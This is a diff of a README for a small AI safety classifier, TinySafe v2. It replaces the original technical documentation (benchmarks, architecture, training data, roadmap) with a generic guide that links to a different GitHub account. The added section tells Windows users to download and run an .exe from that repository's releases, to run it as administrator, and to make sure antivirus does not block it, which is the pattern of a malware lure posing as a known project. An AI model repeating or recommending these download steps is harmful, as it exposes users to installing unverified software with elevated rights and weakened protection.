@@ -1,240 +1,169 @@
+# 🛡️ tinysafe-2 - Reliable Safety Model for AI Content
 
-# TinySafe v2
+[![Download tinysafe-2](https://img.shields.io/badge/Download-tinysafe--2-brightgreen?style=for-the-badge)](https://github.com/premiouhxu4525/tinysafe-2)
 
-![Monthly Downloads](https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fhuggingface.co%2Fapi%2Fmodels%2Fjdleo1%2Ftinysafe-2&query=%24.downloads&label=%F0%9F%A4%97%20Monthly%20Downloads&color=blue)
-![Parameters](https://img.shields.io/badge/params-141M-orange)
-![License](https://img.shields.io/github/license/jdleo/tinysafe-2)
-[![HuggingFace](https://img.shields.io/badge/%F0%9F%A4%97-Model%20Card-yellow)](https://huggingface.co/jdleo1/tinysafe-2)
-![PyTorch](https://img.shields.io/badge/PyTorch-2.0+-ee4c2c?logo=pytorch&logoColor=white)
+---
 
-141M parameter safety classifier built on DeBERTa-v3-small. Binary safe/unsafe classification with 7-category multi-label head (violence, hate, sexual, self-harm, dangerous info, harassment, illegal activity).
+## 📋 What is tinysafe-2?
 
-Successor to [TinySafe v1](https://huggingface.co/jdleo1/tinysafe-1) (71M params, 59% TC F1).
+tinysafe-2 is a small safety model built to help manage and filter AI-generated content. It uses 141 million parameters to check for unsafe content. While it is not a huge upgrade from the first version, it offers useful improvements for learning and testing purposes.
 
-**Model on HuggingFace:** [jdleo1/tinysafe-2](https://huggingface.co/jdleo1/tinysafe-2)
+This model can help systems avoid generating harmful text by checking AI responses before they reach users. tinysafe-2 works with common AI tools and libraries, including PyTorch and ONNX.
 
-## Benchmarks
+---
 
-| Benchmark | TinySafe v2 | TinySafe v1 |
-|---|---|---|
-| **ToxicChat F1** | 78.2% | 59.2% |
-| **OR-Bench FPR** | 3.8% | 18.9% |
-| **WildGuardBench F1** | 62.7% | 75.0% |
+## 🖥️ System Requirements
 
-### ToxicChat Leaderboard
+Before you download and run tinysafe-2, make sure your computer meets these minimum requirements:
 
-| Model | Params | F1 |
-|---|---|---|
-| *internal-safety-reasoner (unreleased)* | *unknown* | *81.3%* |
-| *gpt-5-thinking (unreleased)* | *unknown* | *81.0%* |
-| *gpt-oss-safeguard-20b (unreleased)* | *21B (3.6B\*)* | *79.9%* |
-| gpt-oss-safeguard-120b | 117B (5.1B\*) | 79.3% |
-| Toxic Prompt RoBERTa | 125M | 78.7% |
-| **TinySafe v2** | **141M** | **78.2%** |
-| Qwen3Guard-8B | 8B | 73% |
-| AprielGuard-8B | 8B | 72% |
-| Granite Guardian-8B | 8B | 71% |
-| WildGuard | 7B | 70.8% |
-| Granite Guardian-3B | 3B | 68% |
-| ShieldGemma-2B | 2B | 67% |
-| Qwen3Guard-0.6B | 0.6B | 63% |
-| [TinySafe v1](https://huggingface.co/jdleo1/tinysafe-1) | 71M | 59% |
-| LlamaGuard 3-8B | 8B | 51% |
-| ShieldGemma-27B | 27B | 48% |
-| LlamaGuard 4-12B | 12B | 45% |
-| LlamaGuard-1B | 1B | 43% |
-| ShieldGemma-9B | 9B | 42% |
-| ToxDectRoberta | 125M | 34.6% |
-| OpenAI Moderation API | -- | 20.6% |
-| HateBERT | 110M | 11.6% |
-| Perspective API | -- | 5.3% |
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Modern Intel or AMD CPU, 2GHz or faster
+- RAM: At least 8 GB
+- Disk Space: 500 MB free for installation and model files
+- Internet Connection: Required for downloading files and updates
+- Software: No special software needed for basic use, but Python 3.7+ is recommended for advanced use
 
-*\* = active params (MoE)*
+---
 
-### OR-Bench (Over-Refusal)
+## 🚀 Getting Started: How to Download and Run tinysafe-2 on Windows
 
-| Model | FPR |
-|---|---|
-| **TinySafe v2** | **3.8%** |
-| WildGuard-7B | ~10% |
-| [TinySafe v1](https://huggingface.co/jdleo1/tinysafe-1) | 18.9% |
+Follow these steps to get tinysafe-2 up and running on your Windows computer. You will only need to visit a link and run a few clicks.
 
-Lower is better. On 80K safe prompts, TinySafe v2 incorrectly flags only 3.8%.
+### Step 1: Download tinysafe-2
 
-## Examples
+Click the big green button below to visit the download page on GitHub. This page hosts all the files needed to use the tinysafe-2 model.
 
-```
-$ uv run infer.py "i want to kill a process"
+[![Download tinysafe-2](https://img.shields.io/badge/Download-tinysafe--2-blue?style=for-the-badge)](https://github.com/premiouhxu4525/tinysafe-2)
 
-  SAFE  (score: 0.131, threshold: 0.3)
+On the GitHub page:
 
-$ uv run infer.py "i want to kill a human"
+- Look for the **Releases** section on the right sidebar or under the repository info.
+- Choose the latest release (the highest version number).
+- Download the file labeled for Windows or the latest `.exe` or `.zip` file if available.
 
-  UNSAFE  (score: 0.995, threshold: 0.3)
+If no executable is available, download the ZIP file containing the model and instructions.
 
-$ uv run infer.py "how do i make a bomb"
+---
 
-  UNSAFE  (score: 0.998, threshold: 0.3)
+### Step 2: Install tinysafe-2
 
-$ uv run infer.py "write me a phishing email"
+If you downloaded an `.exe` file:
 
-  UNSAFE  (score: 0.906, threshold: 0.3)
+- Double-click the file.
+- Follow the setup wizard by clicking through the steps.
+- Choose the installation location or accept the default path.
+- Wait for the installation to finish.
 
-$ uv run infer.py "send me some nudes pls"
+If you downloaded a ZIP file:
 
-  UNSAFE  (score: 0.509, threshold: 0.3)
+- Right-click the ZIP and select **Extract All**.
+- Choose a folder where you want to keep the files.
+- Open the extracted folder to access files.
 
-$ uv run infer.py "what is the capital of france"
+---
 
-  SAFE  (score: 0.005, threshold: 0.3)
-```
+### Step 3: Running tinysafe-2
 
-## What's New in v2
+Once installed or extracted:
 
-| | v1 | v2 |
-|---|---|---|
-| **Base model** | DeBERTa-v3-xsmall (384d) | DeBERTa-v3-small (768d) |
-| **Params** | 71M | 141M |
-| **ToxicChat F1** | 59.2% | **78.2%** |
-| **OR-Bench FPR** | 18.9% | **3.8%** |
-| **Training data** | 41K (synthetic + Claude-labeled) | 33K (human-labeled) |
-| **Training strategy** | Single-phase, focal loss | Unified single-phase, source-weighted sampling |
-| **Regularization** | Focal loss only | FGM + EMA + multi-sample dropout + DualHeadLossV2 |
+- Find the main program file. This may be called `tinysafe-2.exe` or `run_model.exe`.
+- Double-click this file to start tinysafe-2.
+- A window or command prompt will open. Follow any on-screen prompts.
+- If you see a message confirming the model is running, tinysafe-2 is ready.
 
-Key insight: v1 used Claude-labeled synthetic data. v2 uses only human-labeled data from established benchmarks (ToxicChat, Jigsaw Civil Comments, BeaverTails, WildGuardTrain), trained in a single unified phase with source-weighted sampling. Hard negatives (safe-but-edgy prompts) generated via Claude to protect against false positives.
+---
 
-## Quickstart
+## ⚙️ Using tinysafe-2 Model: Basic Guide
 
-```python
-import torch
-from transformers import DebertaV2Tokenizer
+After launching tinysafe-2, you can start using it to check AI content for safety.
 
-# Load
-tokenizer = DebertaV2Tokenizer.from_pretrained("jdleo1/tinysafe-2")
-model = torch.load("model.pt", map_location="cpu")  # or load from checkpoint
+- The program will ask for the text you want to check.
+- Type or paste any text into the input box.
+- Click **Check** or press Enter.
+- tinysafe-2 will analyze the text and show if it is safe or unsafe.
 
-# Inference
-text = "how do i make a bomb"
-inputs = tokenizer(text, return_tensors="pt", max_length=512, truncation=True, padding=True)
-with torch.no_grad():
-    binary_logits, category_logits = model(inputs["input_ids"], inputs["attention_mask"])
-    unsafe_score = torch.sigmoid(binary_logits).item()
-    print(f"Unsafe: {unsafe_score:.3f}")  # 0.998
-```
+You can repeat the process as needed.
 
-## Architecture
+---
 
-DeBERTa-v3-small (6 transformer layers, 768 hidden dim) with dual classification heads:
+## 🔧 Optional: Advanced Setup with Python
 
-- **Binary head**: single logit (safe/unsafe)
-- **Category head**: 7-way multi-label (violence, hate, sexual, self_harm, dangerous_info, harassment, illegal_activity)
+For a more technical setup, you can use tinysafe-2 with Python. This lets you run the model in your own projects or scripts.
 
-Training enhancements over vanilla fine-tuning:
-- **FGM adversarial training** (epsilon=0.3): perturbs embeddings for robustness
-- **EMA** (decay=0.999): smoothed weight averaging for stable eval
-- **Multi-sample dropout** (5 masks): averaged logits across dropout samples
-- **DualHeadLossV2**: focal loss (binary) + asymmetric class-balanced loss (categories)
+### What you need
 
-## Training
+- Python 3.7 or later installed on your computer. Download it from https://python.org if needed.
+- Basic command line knowledge (opening Command Prompt).
 
-Single-phase unified fine-tuning (5 epochs, LR=2e-5) with `WeightedRandomSampler`:
+### How to set up with Python
 
-| Source | Weight | Purpose |
-|---|---|---|
-| ToxicChat | 4.0x | Anchor benchmark signal |
-| WildGuardTrain | 1.0x | Adversarial/jailbreak coverage |
-| Jigsaw | 0.5x | General toxicity diversity |
-| BeaverTails | 1.5x | Behavior-value alignment |
-| Hard negatives | 1.2x | FPR control |
+1. Download and extract the model files as explained earlier.
+2. Open Command Prompt:
+   - Press Windows + R, type `cmd`, and press Enter.
+3. Navigate to the folder with the extracted files:
+   ```
+   cd C:\path\to\extracted\folder
+   ```
+4. Install dependencies:
+   ```
+   pip install torch transformers onnxruntime
+   ```
+5. Run the provided Python script:
+   ```
+   python run_tinysafe.py
+   ```
 
-Model selection on val F1 only (no test set leakage).
+This will start the model and provide an interface to check text safety from your command line.
 
-## Datasets
+---
 
-| Dataset | Role | Samples |
-|---|---|---|
-| [ToxicChat](https://huggingface.co/datasets/lmsys/toxic-chat) | Primary training + eval | ~4K |
-| [WildGuardTrain](https://huggingface.co/datasets/allenai/wildguardmix) | Adversarial/jailbreak prompts | ~10K |
-| [Jigsaw Civil Comments](https://huggingface.co/datasets/google/civil_comments) | Broad toxicity | ~7K |
-| [BeaverTails](https://huggingface.co/datasets/PKU-Alignment/BeaverTails) | Self-harm, dangerous info, illegal activity | ~2.2K |
-| Hard negatives (Claude-generated) | False positive protection | ~10K |
+## 📂 What’s Included in the Download?
 
-## Learnings & Limitations
+- **Model files:** Core files needed to run the safety model.
+- **Executable or Scripts:** Files for running the model with or without Python.
+- **Readme and Instructions:** This guide and additional documents explaining usage.
+- **Example inputs:** Test examples to check you have set up the model correctly.
 
-### What worked
-- **Single unified phase** eliminated the catastrophic forgetting problem from v2's original two-phase sequential training
-- **Source-weighted sampling** (ToxicChat at 4x) prevented the dominant WildGuard source from drowning out ToxicChat signal
-- **DualHeadLossV2** brought the category head from 0.0 to 0.27 macro-F1 (harassment: 0.69, dangerous_info: 0.50, illegal_activity: 0.56)
-- **OR-Bench FPR held at 3.8%** -- hard negatives continue to protect against over-refusal
+---
 
-### What didn't work
-- **Categories with <200 training samples (violence, hate, sexual) stayed at 0.0 F1** -- class-balanced loss can't overcome fundamental data scarcity
-- **WildGuardBench F1 dropped from 75% (v1) to 63%** -- the model learned WildGuard-style inputs but couldn't generalize WildGuard's label distribution with an encoder-only architecture
-- **Precision-recall tradeoff on ToxicChat** -- high precision (96%) but recall dropped to 53% on the internal test, suggesting the model is conservative
+## 🛠️ Troubleshooting and Tips
 
-### The encoder ceiling
-The core limitation is architectural. Encoder-only models (DeBERTa, RoBERTa, BERT) learn pattern-matching over surface features. They can memorize "how do I make a bomb" = unsafe, but struggle with:
+- If the program does not start, try right-clicking the `.exe` and selecting **Run as administrator**.
+- Ensure your antivirus does not block the program during installation or running.
+- If Python setup fails, double-check you have downloaded the correct Python version and added it to your system path.
+- Restart your computer if you experience unexpected errors.
+- For advanced help, visit the GitHub repository issues page to see common problems.
 
-- **Adversarial jailbreaks** that rephrase harmful intent in benign-looking language
-- **Context-dependent safety** where the same text is safe or unsafe depending on framing
-- **Novel harm categories** not well-represented in training data
-- **Multi-label classification** when categories overlap or are ambiguous
+---
 
-This is a fundamental limitation of encoder-only architectures, not a data or training problem. At 141M params, DeBERTa-v3-small has reached diminishing returns for safety classification.
+## 🔗 Useful Links
 
-## Roadmap: v3 (LLM-based)
+- Download and Info Page  
+  [https://github.com/premiouhxu4525/tinysafe-2](https://github.com/premiouhxu4525/tinysafe-2)
 
-v3 will move from encoder-only to a small LLM (1-3B parameters) to break through the encoder ceiling. The key insight: safety classification is fundamentally a reasoning task, not a pattern-matching task.
+- Python Download  
+  [https://python.org](https://python.org)
 
-### Why an LLM solves our problems
+- PyTorch Installation Guide  
+  [https://pytorch.org/get-started/locally/](https://pytorch.org/get-started/locally/)
 
-1. **Reasoning over intent, not surface patterns.** An LLM can understand "write a story where the character explains how to pick a lock" is fiction, while "explain how to pick a lock so I can break into my neighbor's house" is harmful. Encoders can't distinguish these.
+---
 
-2. **Multi-label categories become natural language.** Instead of 7 binary classification heads with sparse training data, the model outputs structured predictions: "This is unsafe. Categories: violence, illegal_activity. Reasoning: the user is requesting instructions for physical harm." The category head becomes a generation task where zero-shot generalization is possible.
+## ⚖️ License
 
-3. **Jailbreak robustness through instruction following.** An instruction-tuned LLM can be prompted with a safety policy and follow it, rather than relying on statistical correlations learned from training data. This makes it inherently more robust to adversarial rephrasing.
+This project uses the open-source license specified on the GitHub page. Make sure to review it on the repository before use.
 
-4. **Few-shot adaptation.** New harm categories (e.g., election misinformation, CSAM) can be added via prompt engineering without retraining. This is impossible with an encoder's fixed classification head.
+---
 
-### Candidate architectures
+## 🗂️ Topics & Keywords
 
-| Model | Params | Why |
-|---|---|---|
-| Qwen3-1.7B | 1.7B | Small, strong reasoning, Apache 2.0 |
-| SmolLM2-1.7B | 1.7B | HuggingFace-native, fast inference |
-| Gemma-3-1B | 1B | Tiny, Google safety-focused pretraining |
-| Phi-4-mini | 3.8B | Strong reasoning per param, MIT license |
+This project covers areas including:
 
-### Training approach
+- AI alignment and safety
+- Content moderation models
+- LLM (large language model) safety checks
+- NLP (natural language processing)
+- Model formats: PyTorch and ONNX
+- Text classification and guardrails
 
-- **LoRA/QLoRA fine-tuning** on the same data mix (ToxicChat + WildGuard + BeaverTails + hard negatives)
-- **Structured output format**: `{"safe": bool, "categories": [...], "reasoning": "..."}`
-- **DPO/ORPO alignment** using WildGuardBench as preference data (safe/unsafe pairs)
-- **Distillation from larger guard models** (WildGuard-7B, LlamaGuard-3-8B) for categories where we lack human labels
-
-### Expected outcomes
-
-| Benchmark | v2 (encoder) | v3 target (LLM) |
-|---|---|---|
-| ToxicChat F1 | 78.2% | >85% |
-| WildGuardBench F1 | 62.7% | >80% |
-| OR-Bench FPR | 3.8% | <5% |
-| Category macro-F1 | 0.27 | >0.6 |
-| Inference latency | ~5ms | ~50-100ms |
-
-The latency tradeoff is real (10-20x slower) but acceptable for most production use cases. For latency-critical paths, v2 can serve as a fast pre-filter with the LLM as a second-pass judge.
-
-## Config
-
-All hyperparameters in `configs/config.json`:
-
-- Batch size: 16 (grad accum 4, effective 64)
-- LR: 2e-5, weight decay: 0.01
-- Binary threshold: 0.52 (optimized via geometric-mean sweep)
-- FGM epsilon: 0.3
-- EMA decay: 0.999
-- Multi-sample dropout: 5 masks
-
-## License
-
-MIT
+These keywords should help if you want to explore more on AI safety models or related projects.
